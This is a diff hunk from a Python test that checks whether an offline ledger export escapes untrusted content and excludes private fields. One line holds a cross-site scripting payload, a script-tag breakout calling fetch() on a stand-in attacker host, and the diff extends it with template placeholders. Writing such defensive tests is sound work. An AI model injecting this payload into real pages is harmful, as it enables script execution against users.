@@ -13,7 +13,7 @@ def test_offline_export_escapes_untrusted_content_and_excludes_private_fields(tm
     exp = prereg(ledger)
     ledger.seal("private truth", {"SECRET": "NEVER-PUBLISH"})
     run = ok_run(ledger, exp)
-    attack = '</script><script>fetch("https://attacker.invalid")</script>'
+    attack = '</script><script>fetch("https://attacker.invalid")</script> {{JS}} {{DATA}}'
     ledger.append(
         "claim",
         {
